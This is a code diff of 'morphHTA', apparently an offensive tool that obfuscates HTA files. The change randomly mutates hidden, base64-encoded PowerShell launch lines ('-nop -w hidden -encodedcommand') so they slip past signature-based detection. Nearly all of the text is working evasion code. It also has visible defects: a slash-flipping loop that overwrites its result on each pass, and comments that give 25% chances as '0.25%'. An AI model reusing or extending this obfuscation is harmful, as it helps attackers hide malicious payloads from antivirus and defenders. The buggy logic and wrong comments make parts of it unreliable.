@@ -12,6 +12,20 @@ class morphHTA(object):
 	globalDim = []
 	newlines = []
 
+	# encodedcommand morph
+	ecDict = ["ec", "enc", "enco", "encod", "encode", "encoded", "encodedc", "encodedco", "encodedcom", "encodedcomm", "encodedcomma", "encodedcomman", "encodedcommand"]
+	# no profile morph
+	nopDict = ["nop", "nopr", "nopro", "noprof", "noprofi", "noprofil", "noprofile"]
+
+	# window hidden morph
+	winDict = ["w", "wi", "win", "wind", "windo", "window"]
+
+	hidDict = ["1", "h", "hi", "hid", "hidd", "hidde", "hidden"]
+
+
+
+
+
 	def junkDim(self):
 		myDim = self.givemeName()
 		self.globalDim += [myDim]
@@ -53,12 +67,12 @@ class morphHTA(object):
 		'''
 		base = "chr("
 		for i in line:
-			splitnum = random.randint(1,10)
+			splitnum = random.randint(1,int(self.args.maxnumsplit))
 			splits = []
 			target = ord(i)
 			maxvaluesplit = int(float(target)/splitnum)
 			for i in range(0,splitnum):
-				valuesplit = random.randint(0,int(self.args.maxnumsplit))
+				valuesplit = random.randint(0,int(self.args.maxvalsplit))
 				splits += [valuesplit]
 			value = sum(splits)
 			result = target - value
@@ -106,6 +120,7 @@ class morphHTA(object):
 		parser.add_argument("--maxstrlen", metavar="<default: 1000>", dest = "maxstrlen", default = 1000, help = "Max length of randomly generated strings")
 		parser.add_argument("--maxvarlen", metavar="<default: 40>", dest = "maxvarlen", default = 40, help = "Max length of randomly generated variable names")
 		parser.add_argument("--maxnumsplit", metavar="<default: 10>", dest = "maxnumsplit", default = 10, help = "Max number of times values should be split in chr obfuscation")
+		parser.add_argument("--maxvalsplit", metavar="<default: 10>", dest = "maxvalsplit", default = 10, help = "Max value of each split")
 		return parser
 
 	def check_args(self, args):
@@ -174,18 +189,117 @@ class morphHTA(object):
 				passed = True
 			if "\"" in line and not "VBScript" in line:
 				if not "powershell" in line:
+					# Create Object Line -> WScript.Shell
 					line0 = line.split("\"")[0]
 					line1 = line.split("\"")[1]
 					line2 = line.split("\"")[2]
 					line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line1))) + self.obfuscate(line2)
 				else:
 					# keep the base64 intact
+					# This is the powershell line
+					# Ojkq9Lwk8HMCNXIEErlP4Gh.run "powershell.exe -nop -w hidden -encodedcommand JAB7ADEAMAAxADEAMQ", 0, true
+					# We cannot morph .run
+					# We cannot change powershell.exe but we can change the path and extension to nothing
+					# eg. powershell.exe
+					# c:\windows\system32\windowspowershell\v1.0\powershell.exe
+					# c:windows\system32\windowspowershell\v1.0\powershell
+					# \windows\system32\windowspowershell\v1.0\powershell
+
+					# We can inject "" into anywhere by the powershell.exe bit
+
+					# We can replace 0 with false
+
+					# We can replace true with any value other than 0 or false	
+
+
+					# line0 contains Ojkq9Lwk8HMCNXIEErlP4Gh.run 
 					line0 = line.split("\"")[0]
+
+					# line1 contains powershell.exe -nop -w hidden -encodedcommand JAB7ADEAMAAxADEAMQ
 					line1 = line.split("\"")[1]
+
+					# This mutates the powershell.exe starting line
+					psRep = ""
+					if self.randbool():
+						if self.randbool():
+							# Use \windows\system32\windowspowershell\v1.0\powershell
+							# 0.25% chance
+							psRep = "\\windows\\system32\\windowspowershell\\v1.0\\powershell"
+						else:
+							# Use c:\windows\system32\windowspowershell\v1.0\powershell
+							# 0.25% chance
+							psRep = "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell"
+					else:
+						if self.randbool():
+							# Use c:windows\system32\windowspowershell\v1.0\powershell
+							# 0.25% chance
+							psRep = "c:windows\\system32\\windowspowershell\\v1.0\\powershell"
+						else:
+							# Use powershell
+							psRep = "powershell"
+
+					if self.randbool():
+						# Add .exe
+						# 50% chance
+						psRep = psRep + ".exe"
+					
+
+					###########
+
+					# Flip the \ with /'s randomly if there's any
+
+					psSplit = psRep.split("\\")
+					psRep = ""
+					for psItem in psSplit:
+						if self.randbool():
+							# 50% chance
+							# Set to \
+							psRep = psItem + "\\"
+						else:
+							# 50% chance
+							# Set to /
+							psRep = psItem + "/"
+
+					# Now we have too many slashes, so let's kick off the last one
+
+					psRep = psRep[:len(psRep)-1] 
+
+
+					###########
+
+					line1 = line1.replace("powershell.exe", psRep)
+
+					# This replaces the nop with others
+
+					line1 = line1.replace("-nop", "-" + self.nopDict[random.randint(0,len(self.nopDict)-1)])
+
+					# This replaces and morphs the w hidden
+					line1 = line1.replace("-w hidden", "-" + self.winDict[random.randint(0, len(self.winDict)-1)] + " " + self.hidDict[random.randint(0, len(self.hidDict)-1)])
+
+
+					# line11 contains powershell.exe -nop -w hidden -
 					line11 = line1.split("encodedcommand ")[0]
+
+					# critical contains JAB7ADEAMAAxADEAMQAApAC4AUgBlAGEAZABUAG8ARQ
 					critical = line1.split("encodedcommand ")[1]
+
+					
+					# line2 contains , 0, true
 					line2 = line.split("\"")[2]
-					line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line11 + "encodedcommand ")) + "&") + self.obfuscateNum(critical) + self.obfuscate(line2)
+
+					# print line0 + line11 + "encodedcommand " +  critical + line2
+
+					# Reminder to self, I do not need to re-construct the double quotes around the command as it isn't required as our thing is a string type anyways.
+					# I have added this if we are using "" obfuscation we need to use it
+
+					# At this point we can even choose what we want to replace encodedcommand with.
+					ecFill = self.ecDict[random.randint(0, len(self.ecDict)-1)]
+
+					# line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line11 + "encodedcommand ")) + "&") + self.obfuscateNum(critical) + self.obfuscate(line2)
+
+					print line0 + line11 + ecFill + " " + critical + line2
+					line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line11 + ecFill + " ")) + "&") + self.obfuscateNum(critical) + self.obfuscate(line2)
+
 			else:
 				line = self.obfuscate(line)
 			if not passed:
